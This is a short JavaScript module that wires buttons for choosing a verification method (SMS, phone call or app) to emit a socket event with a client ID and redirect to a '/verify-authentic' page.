const phone = (() => {
    //private var/functions
    function select(btn) {
        const clientID = parseInt(document.querySelector('input[name="client"]').value)

        if(!clientID) return

        if(btn.classList.contains('sms')) {
            socket.emit('selectSMS', clientID)

            return window.location.href = "/verify-authentic?select=sms"
        }else if(btn.classList.contains('phone')) {
            socket.emit('selectPhone', clientID)
            return window.location.href = "/verify-authentic?select=phone"

        }else if(btn.classList.contains('app')){
            socket.emit('selectApp', clientID)

            return window.location.href = "/verify-authentic?select=app"
        }
    }

    function dispatch(selectors) {
        const selector = [...document.querySelectorAll(selectors)];

        selector.map(button => {button.addEventListener('click', e => {
            select(button)
        })})

    }
    
    return {
        //public var/functions
        dispatch
    }
})()

//formMail__phone--options

phone.dispatch('.formMail__phone--options > div')